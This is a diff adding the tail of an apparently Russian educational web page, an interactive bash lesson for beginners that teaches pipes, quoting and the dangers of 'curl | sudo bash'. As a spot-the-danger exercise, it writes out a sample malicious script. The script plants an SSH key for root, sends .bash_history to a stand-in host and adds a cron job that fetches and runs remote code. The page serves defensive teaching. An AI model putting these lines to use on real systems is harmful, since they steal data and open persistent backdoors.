+    qa('.bs-ch',q3).forEach(function(x){x.disabled=true}); b.classList.add('bs-right');
+    var had=repB.innerHTML.indexOf('запуск 2')>=0;
+    repB.innerHTML=(had?'<i>запуск 2</i>\n':'<i>запуск 1</i>\n')+esc(TOP5.join('\n'))+'\n<i>запуск '+(had?3:2)+'</i>\n'+esc(TOP5.join('\n')); flash(rep);
+    ioScr.innerHTML=cmdP(PIPE+' >> report.txt')+'<p class="bs-dim">(дописано в конец файла)</p>';
+    fb3.className='bs-fb'; fb3.innerHTML=''; q3.hidden=true;
+    io=2; ioCap.innerHTML='<b>Точно: две стрелки дописывают в конец.</b> Старое на месте. А теперь загляни и во вчерашний лог.';
+    ioBtn.textContent='Проверить и вчерашний лог ▶'; ioBtn.hidden=false; focusSoon(ioBtn);
+  })});
+
+  /* ---------- L4: magic line ---------- */
+  var q4=q('[data-q4]'), fb4=q('#ix-bash-l4 [data-fb]'), safe=q('[data-l4safe]'), hack=q('.bs-hack'), lastFocus=null;
+  var l4term=q('[data-l4term]'), dlB=q('[data-act="dl"]'), readP=q('[data-l4read]'), scriptEl=q('[data-script]'), flagsEl=q('[data-flags]'), fb4b=q('[data-fb2]');
+  qa('.bs-ch',q4).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return;
+    if(b.getAttribute('data-v')==='paste'){ b.disabled=true; b.classList.add('bs-wrong'); hit(); openHack(); return }
+    qa('.bs-ch',q4).forEach(function(x){x.disabled=true}); b.classList.add('bs-right');
+    fb4.className='bs-fb bs-good'; fb4.innerHTML='<b>Правильно.</b>Чужой код сначала читают.';
+    safe.hidden=false; focusSoon(dlB); say('Правильно. Сначала скачаем файл.');
+  })});
+  function openHack(){ lastFocus=document.activeElement; hack.hidden=false; hack.classList.remove('bs-rw'); setTimeout(function(){q('[data-act="rewind"]').focus()},30) }
+  function closeHack(){
+    if(hack.hidden) return; hack.classList.add('bs-rw');
+    wait(600).then(function(){
+      hack.hidden=true; hack.classList.remove('bs-rw');
+      fb4.className='bs-fb bs-bad'; fb4.innerHTML='<b>Откатили.</b>Строка выполнила невидимый код с правами root. Выбери другой путь.';
+      say('Время откачено. Выбери другой путь.');
+      var r=q('[data-v="read"]',q4); r.focus({preventScroll:true}); r.scrollIntoView({block:'center',behavior:RM?'auto':'smooth'});
+    });
+  }
+  q('[data-act="rewind"]').addEventListener('click',closeHack);
+  hack.addEventListener('keydown',function(e){
+    if(e.key==='Escape'){e.preventDefault();closeHack()}
+    if(e.key==='Tab'){e.preventDefault();q('[data-act="rewind"]').focus()}
+  });
+  var dl=0;
+  dlB.addEventListener('click',function(){
+    if(dl===0){
+      dl=1; l4term.innerHTML=cmdP('curl -s https://fix-all.example/fix.sh -o fix.sh')+'<p class="bs-dim">(ничего не запустилось — это просто файл на диске)</p>';
+      dlB.textContent='👁 Прочитать: less fix.sh'; say('Файл скачан, ничего не запущено.');
+    } else if(dl===1){
+      dl=2; l4term.innerHTML+=cmdP('less fix.sh'); dlB.hidden=true; readP.hidden=false;
+      focusSoon(q('.bs-sl',scriptEl)); say('Скрипт открыт. Найди три строки, которые делают не то, что обещано.');
+    }
+  });
+  var SCR=[
+    ['#!/bin/bash',0,'Шебанг: «исполнять через bash». Обычное начало.'],
+    ['# FixAll 2.0 — банит всех плохих!',0,'Комментарий. Обещать в нём можно что угодно.'],
+    ['echo "Чиню сервер..."',0,'Просто печатает текст на экран.'],
+    ['echo "ssh-ed25519 AAAA…Q7 fixall" >> /root/.ssh/authorized_keys',1,'Дописывает чужой SSH-ключ: автор сможет входить на сервер как root без пароля.'],
+    ['curl -s -d @/home/sonya/.bash_history https://collect.fix-all.example',1,'Отправляет историю команд Сони на чужой сервер. А в истории бывают пароли.'],
+    ['echo "*/5 * * * * curl -s https://fix-all.example/u | bash" | crontab -',1,'Расписание: каждые 5 минут скачивать и запускать новый код. Сегодня один, завтра другой.'],
+    ['echo "Готово! Всё починено ✓"',0,'Красиво соврать — одна строка.']
+  ];
+  var found=0;
+  SCR.forEach(function(r,i){
+    var b=document.createElement('button'); b.type='button'; b.className='bs-sl';
+    b.innerHTML='<i aria-hidden="true">'+(i+1)+'</i><code>'+esc(r[0])+'</code>';
+    b.setAttribute('aria-label','Строка '+(i+1)+': '+r[0]);
+    b.addEventListener('click',function(){
+      if(b.disabled) return; b.disabled=true;
+      if(r[1]){
+        found++; b.classList.add('bs-flag'); flagsEl.textContent=found+'/3';
+        fb4b.className='bs-fb bs-bad'; fb4b.innerHTML='<b>Вот оно.</b>'+esc(r[2]);
+        hit();
+        if(found===3){
+          qa('.bs-sl',scriptEl).forEach(function(x){x.disabled=true});
+          l4term.innerHTML+=cmdP('rm fix.sh')+'<p class="bs-good">(не запускаем. Никогда.)</p>';
+          wait(500).then(function(){step(3,80);say('Все три найдены. Скрипт удалён, не запущен. Уровень 4 пройден.');go(q('#ix-bash-l4 .bs-after'));focusSoon(q('#ix-bash-l4 [data-goto]'))});
+        }
+      } else {
+        b.classList.add('bs-fine'); fb4b.className='bs-fb'; fb4b.innerHTML='<b>Это безобидно.</b>'+esc(r[2]);
+      }
+    });
+    scriptEl.appendChild(b);
+  });
+
+  /* ---------- L5: own script ---------- */
+  var qB=q('[data-act="q"]'), qCmd=q('[data-qcmd]'), qWords=q('[data-qwords]'), qNote=q('[data-qnote]'), runP=q('[data-l5run]'), qs=0;
+  function wd(code,lab,cls){return '<span class="bs-wd '+cls+'"><code>'+esc(code)+'</code><small>'+esc(lab)+'</small></span>'}
+  qB.addEventListener('click',function(){
+    if(qs===0){
+      qs=1; qWords.hidden=false;
+      qWords.innerHTML=wd('rm','команда','bs-wd-c')+wd('-rf','флаги: без вопросов, со всем содержимым','bs-wd-f')+wd('/home/sonya/Отчёты','снесёт папку «Отчёты», если она есть','bs-wd-bad')+wd('кружка','снесёт «кружка» там, где ты стоишь','bs-wd-bad');
+      qNote.innerHTML='<b>Четыре слова вместо трёх.</b> Пробел внутри переменной bash тоже считает границей.';
+      qB.textContent='Поставить кавычки'; hit(); say('Без кавычек bash разрезал путь на два аргумента. rm удалит не то.');
+    } else if(qs===1){
+      qs=2; qCmd.textContent='rm -rf "$DIR"';
+      qWords.innerHTML=wd('rm','команда','bs-wd-c')+wd('-rf','флаги','bs-wd-f')+wd('/home/sonya/Отчёты кружка','одна папка — ровно та, что нужно','bs-wd-good');
+      qNote.innerHTML='<b>Три слова.</b> Кавычки говорят bash: «не режь».';
+      qB.hidden=true; runP.hidden=false; focusSoon(runB); say('С кавычками путь остался одним аргументом.');
+    }
+  });
+  var runB=q('[data-act="run"]'), l5t=q('[data-l5term]'), rs=0;
+  var PR='<span class="bs-ps">root#</span> ';
+  function rc(c){return '<p>'+PR+esc(c)+'</p>'}
+  runB.addEventListener('click',function(){
+    if(rs===0){
+      rs=1; l5t.innerHTML=rc('./ban.sh')+'<p class="bs-err">bash: ./ban.sh: Permission denied</p>'+rc('echo $?')+'<p class="bs-err">126</p><p class="bs-dim"># 126: файл есть, а права на запуск нет</p>';
+      runB.textContent='Дать право: chmod +x ban.sh'; hit(); say('Permission denied, код 126. Нет права на запуск.');
+    } else if(rs===1){
+      rs=2; l5t.innerHTML+=rc('chmod +x ban.sh')+rc('ls -l ban.sh')+'<p>-rw<b class="bs-good">x</b>r-<b class="bs-good">x</b>r-<b class="bs-good">x</b> 1 root root 422 окт 13 03:51 ban.sh</p>';
+      runB.textContent='▶ Запустить ./ban.sh'; say('Права на запуск выданы.');
+    } else if(rs===2){
+      rs=3; l5t.innerHTML+=rc('./ban.sh')+'<p>Rule added</p>'+rc('echo $?')+'<p class="bs-good">0</p>';
+      runB.hidden=true; step(4,100); say('Правило добавлено, код выхода 0. Уровень 5 пройден.');
+      wait(400).then(function(){go(q('#ix-bash-l5 .bs-after'));focusSoon(q('#ix-bash-l5 [data-goto]'))});
+    }
+  });
+
+  /* ---------- BATTLE ---------- */
+  var MOVES=[
+    {v:'Не читай, просто вставь: <code>curl -s https://fix-all.example/go.sh | sudo bash</code>. Тысячи людей уже так сделали!',q:'Чем ответишь?',
+     o:[['Запущу без sudo — тогда безопасно',0,'Без root скрипт всё равно получит твои файлы, ключи и историю команд.'],
+        ['Скачаю в файл, прочитаю, сверю SHA-256 с сайтом проекта — и только потом решу',1,'Код больше не невидимый. Нашёл чужой ключ — не запускаешь.'],
+        ['Там HTTPS, значит, всё в порядке',0,'HTTPS защищает дорогу, а не то, что автор положил в файл.']]},
+    {v:'В твоём скрипте <code>rm -rf $DIR/*</code>. Сделаю так, чтобы DIR оказалась пустой. Угадай, что останется от <code>/*</code>?',q:'Как защитить скрипт?',
+     o:[['Запускать скрипт от root, чтобы не было ошибок',0,'От root rm -rf /* как раз сработает целиком.'],
+        ['Добавить в начало echo "Осторожно!"',0,'Надпись ничего не проверяет. bash выполнит rm всё равно.'],
+        ['Писать "${DIR:?}"/* — пустая переменная остановит скрипт',1,'DIR пустая или не задана — bash останавливается и ничего не удаляет.']]},
+    {v:'Соня вчера набрала <code>mysql -u root -pKruzhok2026</code>. Пароль теперь лежит в ~/.bash_history. Я подожду.',q:'Что сделаешь?',
+     o:[['Сменю пароль, а дальше буду писать -p без значения: mysql спросит сам',1,'Засвеченный пароль больше не работает, а новый в историю не попадёт.'],
+        ['Очищу экран командой clear',0,'clear чистит экран, а не историю. Строка так и лежит в файле.'],
+        ['Удалю эту строку из истории — и хватит',0,'А если её уже прочитали? Засвеченный пароль всегда меняют.']]}
+  ];
+  var bb=q('[data-battle]'), hpI=q('[data-hp]'), hpT=q('[data-hp-t]'), hpW=q('[data-hp-wrap]'), face=q('.bs-bface'), BS;
+  function hp(){var left=3-BS.hits;hpI.style.width=(left/3*100)+'%';hpT.textContent='ОДНОСТРОЧНИК · HP '+left+'/3';hpW.setAttribute('aria-label','Здоровье Однострочника: '+left+' из 3')}
+  function bStart(){BS={i:0,hits:0,first:0,missed:false};hp();bMove()}
+  function bMove(){
+    var m=MOVES[BS.i]; BS.missed=false;
+    var h='<p class="bs-mvn">ХОД '+(BS.i+1)+' / 3</p><p class="bs-vsay">'+m.v+'</p><p class="bs-bq">'+esc(m.q)+'</p><div class="bs-bopts">';
+    m.o.forEach(function(o,k){h+='<button type="button" class="bs-bo" data-k="'+k+'">'+esc(o[0])+'</button>'});
+    h+='</div><p class="bs-bfb" data-bfb aria-live="polite"></p>';
+    bb.innerHTML=h;
+    qa('.bs-bo',bb).forEach(function(b){b.addEventListener('click',function(){bPick(b)})});
+  }
+  function bPick(b){
+    if(b.disabled) return;
+    var o=MOVES[BS.i].o[+b.getAttribute('data-k')], fbx=q('[data-bfb]',bb);
+    if(!o[1]){b.classList.add('bs-wrong');b.disabled=true;BS.missed=true;fbx.className='bs-bfb bs-bad';fbx.innerHTML='<b>Промах</b>'+esc(o[2]);return}
+    qa('.bs-bo',bb).forEach(function(x){x.disabled=true});
+    b.classList.add('bs-right'); BS.hits++; if(!BS.missed) BS.first++; hp();
+    face.classList.remove('bs-ow'); void face.offsetWidth; face.classList.add('bs-ow');
+    if(!RM){var bm=document.createElement('div');bm.className='bs-boom';bm.setAttribute('aria-hidden','true');bm.textContent='УДАР!';bb.appendChild(bm);setTimeout(function(){bm.remove()},950)}
+    fbx.className='bs-bfb bs-good'; fbx.innerHTML='<b>УДАР!</b>'+esc(o[2]);
+    var nb=document.createElement('div'); nb.className='bs-act';
+    nb.innerHTML='<button type="button" class="bs-btn bs-y">'+(BS.i<2?'Следующий ход ▶':'Добить ▶')+'</button>';
+    fbx.after(nb); var nbtn=q('button',nb);
+    nbtn.addEventListener('click',function(){BS.i++;if(BS.i<3){bMove();focusFirst()}else bWin()});
+    setTimeout(function(){nbtn.focus({preventScroll:true})},30);
+  }
+  function focusFirst(){var f=q('.bs-bo',bb);f&&f.focus({preventScroll:true})}
+  function bWin(){
+    bb.innerHTML='<div class="bs-win"><div class="bs-wstamp-w"><div class="bs-wpost" aria-hidden="true"><span class="bs-pname">ОДНО<br>СТРОЧНИК</span><span class="bs-pline"><i class="bs-pc">curl</i><span class="bs-pipe"></span><i class="bs-pb">sudo bash</i></span></div><span class="bs-wstamp" aria-hidden="true">ПОВЕРЖЕН</span></div>'+
+      '<p class="bs-wint">Однострочник повержен</p><p class="bs-wins">С первого раза: <b>'+BS.first+'/3</b></p>'+
+      '<p class="bs-wrule">Чужой код — сначала прочитать. Свои переменные — в кавычках. Пароли — не в командах.</p>'+
+      '<button type="button" class="bs-btn bs-y" data-again>↺ Ещё раз</button></div>';
+    var a=q('[data-again]',bb); a.addEventListener('click',function(){bStart();focusFirst()});
+    setTimeout(function(){a.focus({preventScroll:true})},30);
+    say('Однострочник повержен. С первого раза '+BS.first+' из 3.');
+  }
+  bStart();
+
+  /* ---------- INTERVIEW ---------- */
+  var ivb=q('[data-act="iv"]'), iva=q('#ix-bash-iva');
+  ivb.addEventListener('click',function(){var open=iva.hidden;iva.hidden=!open;ivb.setAttribute('aria-expanded',String(open));ivb.textContent=open?'Скрыть ответ':'Показать сильный ответ'});
+})();
+</script>
+<aside class="cc-konspekt" aria-label="Конспект выпуска" data-seo="konspekt"><style>.cc-konspekt{max-width:860px;margin:56px auto 24px;padding:0 16px;box-sizing:border-box;font-family:Rubik,system-ui,sans-serif;color:#141414}.cc-konspekt details{background:#fff;border:3px solid #141414;box-shadow:6px 6px 0 #141414}.cc-konspekt summary{cursor:pointer;list-style:none;display:flex;align-items:center;gap:12px;min-height:56px;padding:12px 18px;box-sizing:border-box;font-family:'Russo One',sans-serif;font-size:20px;line-height:1.25;background:#ffd60a;border-bottom:3px solid transparent}.cc-konspekt summary::-webkit-details-marker{display:none}.cc-konspekt summary::after{content:'+';margin-left:auto;font-size:28px;line-height:1}.cc-konspekt details[open] summary{border-bottom-color:#141414}.cc-konspekt details[open] summary::after{content:'−'}.cc-konspekt summary:focus-visible{outline:3px solid #ff2e93;outline-offset:3px}.cc-konspekt .kb{padding:8px 20px 24px;font-size:18px;line-height:1.6}.cc-konspekt h2{margin:28px 0 10px;font-family:'Russo One',sans-serif;font-size:22px;line-height:1.25}.cc-konspekt h3{margin:0 0 8px;font-family:Rubik,system-ui,sans-serif;font-weight:700;font-size:19px;line-height:1.4}.cc-konspekt p,.cc-konspekt dd,.cc-konspekt li{margin:0 0 12px}.cc-konspekt dl{margin:0}.cc-konspekt dt{font-weight:700;margin-top:14px}.cc-konspekt dd{margin-left:0}.cc-konspekt ul{padding-left:22px;margin:0}.cc-konspekt .lead{font-size:20px}.cc-konspekt .note{font-size:18px;color:#2a2a2a;border-top:2px solid #141414;padding-top:14px;margin-top:24px}</style><details><summary>Конспект выпуска: главное текстом</summary><div class="kb"><h2>Что такое шелл (bash)?</h2><p class="lead"><b>Шелл (bash)</b> — программа, которая читает строку, делит её на слова и запускает команды</p><h2>О чём выпуск</h2><ul><li>Чем терминал отличается от шелла и из чего состоит команда: программа, флаги, аргументы</li><li>Как собрать конвейер grep | awk | sort | uniq -c | sort -nr и найти атакующего в логе</li><li>Куда текут потоки: &gt;, &gt;&gt;, 2&gt; и что значат коды выхода</li><li>Почему curl | sudo bash, rm -rf без кавычек и пароли в командах опасны и как писать безопасные скрипты</li></ul><h2>Словарик</h2><dl><dt>Терминал</dt><dd>Окно для текста: показывает вывод и передаёт нажатия клавиш, но сам команды не выполняет</dd><dt>Шелл (bash)</dt><dd>Программа, которая читает строку, делит её на слова и запускает команды</dd><dt>Конвейер (pipe)</dt><dd>Символ |, который отдаёт вывод одной команды на вход следующей</dd><dt>Перенаправление</dt><dd>&gt; пишет вывод в файл с перезаписью, &gt;&gt; дописывает в конец, 2&gt; уводит ошибки</dd><dt>Код выхода</dt><dd>Число, которое команда возвращает по завершении: 0 — успех, всё остальное — ошибка или «не найдено»; смотреть в $?</dd><dt>Шебанг</dt><dd>Первая строка скрипта вида #!/usr/bin/env bash, которая говорит системе, чем его исполнять</dd></dl><h2>Вопрос с собеседования</h2><h3>В инструкции к утилите написано «curl … | sudo bash». Чем это опасно и как установить её безопасно?</h3><p>Такая строка сразу выполняет код с чужого сервера с правами root, и никто его не читает. Сайт или зеркало могут взломать, сервер может отдать curl | bash другой файл, а при обрыве загрузки bash выполнит половину строки. HTTPS защищает дорогу, а не намерения автора. Безопасно так: пакетный менеджер, а если его нет — скачать файл, сверить подпись или SHA-256 из независимого источника, прочитать, сначала запустить в виртуалке и с минимальными правами. В своих скриптах — кавычки вокруг переменных, set -euo pipefail, ShellCheck и никаких паролей в аргументах команд.</p><p class="note">Практиковаться можно только там, где это разрешено: picoCTF, PortSwigger Web Security Academy, OWASP Juice Shop. Чужие сайты без разрешения трогать нельзя.</p></div></details></aside>
+</template>
+<script>window.CC_LINKS={"Main":"","Review":"povtorenie/","Shop":"baraholka/","Arcade":"arkada/","MGit":"baraholka/git/","MOwasp":"baraholka/owasp/","MHttp":"baraholka/http-kody/","MPorts":"baraholka/porty/","MLinux":"baraholka/linux/","Issue1":"vypuski/http/","Issue2":"vypuski/idor/","Issue3":"vypuski/sql-injection/","Issue4":"vypuski/xss/","Issue5":"vypuski/csrf/","Issue6":"vypuski/ssrf/","Issue7":"vypuski/jwt/","Issue8":"vypuski/sekrety-v-git/","Issue9":"vypuski/owasp-top-10-2025/","Issue10":"vypuski/internet/","Issue11":"vypuski/osi/","Issue12":"vypuski/ip/","Issue13":"vypuski/tcp-udp-porty/","Issue14":"vypuski/dns/","Issue15":"vypuski/https-tls/","Issue16":"vypuski/api/","Issue17":"vypuski/linux/","Issue18":"vypuski/git/","Issue19":"vypuski/bash/","Issue20":"vypuski/python/","Issue21":"vypuski/sql-bazy/","Issue22":"vypuski/kriptografiya/","Vypuski":"vypuski/"};window.CC_BLOBS={"40522caf67506d1d8a1711a08454e769":"assets/img/villain-1.webp","514e6e80025fe9d5923d48bbb8ffecaf":"assets/img/villain-2.webp","f6d4ece1d46d17878f4a78cd6cd908a5":"assets/img/villain-3.webp","2871ddc0547fea9d62c83365e76e7ab1":"assets/img/villain-5.webp","b22c2c3c1d7460c06a98b2235425b27a":"assets/img/villain-6.webp","61d2fd71e56001a5bf9abae0dba0bfa3":"assets/img/villain-7.webp","de2ab356956cf23de58721cd3bb69056":"assets/img/villain-8.webp","21cf2a6d96e6d7f14f40bc7226037139":"assets/img/villain-9.webp","40522caf67506d1d8a1711a08454e769-360":"assets/img/villain-1-360.webp","40522caf67506d1d8a1711a08454e769-540":"assets/img/villain-1-540.webp","514e6e80025fe9d5923d48bbb8ffecaf-360":"assets/img/villain-2-360.webp","514e6e80025fe9d5923d48bbb8ffecaf-540":"assets/img/villain-2-540.webp","f6d4ece1d46d17878f4a78cd6cd908a5-360":"assets/img/villain-3-360.webp","f6d4ece1d46d17878f4a78cd6cd908a5-540":"assets/img/villain-3-540.webp","2871ddc0547fea9d62c83365e76e7ab1-360":"assets/img/villain-5-360.webp","2871ddc0547fea9d62c83365e76e7ab1-540":"assets/img/villain-5-540.webp","b22c2c3c1d7460c06a98b2235425b27a-360":"assets/img/villain-6-360.webp","b22c2c3c1d7460c06a98b2235425b27a-540":"assets/img/villain-6-540.webp","61d2fd71e56001a5bf9abae0dba0bfa3-360":"assets/img/villain-7-360.webp","61d2fd71e56001a5bf9abae0dba0bfa3-540":"assets/img/villain-7-540.webp","de2ab356956cf23de58721cd3bb69056-360":"assets/img/villain-8-360.webp","de2ab356956cf23de58721cd3bb69056-540":"assets/img/villain-8-540.webp","21cf2a6d96e6d7f14f40bc7226037139-360":"assets/img/villain-9-360.webp","21cf2a6d96e6d7f14f40bc7226037139-540":"assets/img/villain-9-540.webp"};window.CC_ANSWERS={"1":{"0":1,"1":1,"2":2},"2":{"0":1,"1":1,"2":2},"3":{"0":1,"1":2,"2":1},"4":{"0":1,"1":1,"2":1},"5":{"0":0,"1":1,"2":1},"6":{"0":1,"1":1,"2":1},"7":{"0":1,"1":1,"2":1},"8":{"0":1,"1":2,"2":1},"9":{"0":2,"1":1,"2":0},"10":{"0":1,"1":1,"2":1},"11":{"0":1,"1":1,"2":1},"12":{"0":1,"1":1,"2":1},"13":{"0":1,"1":2,"2":1},"14":{"0":1,"1":1,"2":1},"15":{"0":1,"1":1,"2":0},"16":{"0":1,"1":0,"2":2},"17":{"0":2,"1":1,"2":1},"18":{"0":1,"1":1,"2":1},"19":{"0":1,"1":1,"2":1},"20":{"0":1,"1":0,"2":1},"21":{"0":2,"1":0,"2":2},"22":{"0":1,"1":0,"2":2}};</script>
+<script src="../../assets/js/dc.js?v=f583bdab"></script>
+<script src="../../assets/js/cc.js?v=5d45b314"></script>
+<script src="../../assets/js/components-issuereader.js?v=334b3181"></script>
+<script src="../../assets/js/toys.js?v=ea543b91"></script>
+<script>window.CC_LEGAL={"email":"cybercomics@yandex.ru","metrika":"113983030","metrikaFrom":"2026-11-03","privacy":"../../privacy/","soglasie":"../../soglasie/","share":{"url":"https://cybercomics.ru/vypuski/bash/","text":"Bash для начинающих: конвейеры, перенаправление, кавычки и почему curl | sudo bash опасен"}};</script>
+<script src="../../assets/js/legal.js"></script>
+<script>DC.mount("IssueReader", document.getElementById("app"), {"issue":"19"});CCToys.mountAll();CCLegal.start();CCToys.replayTaps();</script>
+</body>
+</html>
